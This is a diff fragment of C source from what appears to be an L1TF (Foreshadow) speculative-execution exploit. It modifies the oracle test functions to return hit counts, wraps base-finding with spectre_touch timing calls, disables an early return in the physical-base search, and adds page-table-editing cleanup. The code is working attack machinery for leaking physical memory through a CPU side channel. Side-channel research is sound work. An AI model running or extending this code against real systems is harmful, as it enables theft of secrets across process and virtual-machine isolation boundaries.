@@ -625,7 +625,7 @@ static int l1tf_oracle16(uint16_t magic, uintptr_t pa, int nr_tries, void *touch
   return hits;
 }
 
-void l1tf_test(void *va, uintptr_t pa, int iters)
+int l1tf_test(void *va, uintptr_t pa, int iters)
 {
   *(uint64_t *)va = rand64();
   uint64_t t_start = clock_read();
@@ -633,15 +633,19 @@ void l1tf_test(void *va, uintptr_t pa, int iters)
   double time = (clock_read()-t_start)/1000000000.0;
   printf("l1tf_test: hits %6d (%4.1f%%) | hits/sec %6.1f K | iters/sec %6.1f K\n",
       hits, 100.0*hits/iters, hits/time/1000, iters/time/1000);
+  return hits;
 }
 
-void l1tf_test_base(uintptr_t pa, int iters)
+int l1tf_test_base(uintptr_t pa, int iters)
 {
+  spectre_touch_base_start();
   uint64_t t_start = clock_read();
   int hits = l1tf_oracle16(0xffff, pa+6, iters, NULL);
   double time = (clock_read()-t_start)/1000000000.0;
+  spectre_touch_base_stop();
   printf("l1tf_test_base: hits %6d (%4.1f%%) | hits/sec %6.1f K | iters/sec %6.1f K\n",
       hits, 100.0*hits/iters, hits/time/1000, iters/time/1000);
+  return hits;
 }
 
 uintptr_t l1tf_find_page_pa(void *p)
@@ -726,12 +730,14 @@ uintptr_t l1tf_find_base(void)
           uintptr_t len = (pa-start) + run*(end-start);
           printf("l1tf_find_base: found pa %lx in %.1f sec (%.1f MB/s)\n", pa, time, len/time / (1024*1024));
         }
-        spectre_touch_base_stop();
-        return pa;
+        // spectre_touch_base_stop();
+        // return pa;
       }
     }
   }
   spectre_touch_base_stop();
+  l1tf_leak_buffer_modify(&leak_addr, leak_addr.original_pfn << 12);
+  ptedit_cleanup();
   return -1;
 }
 
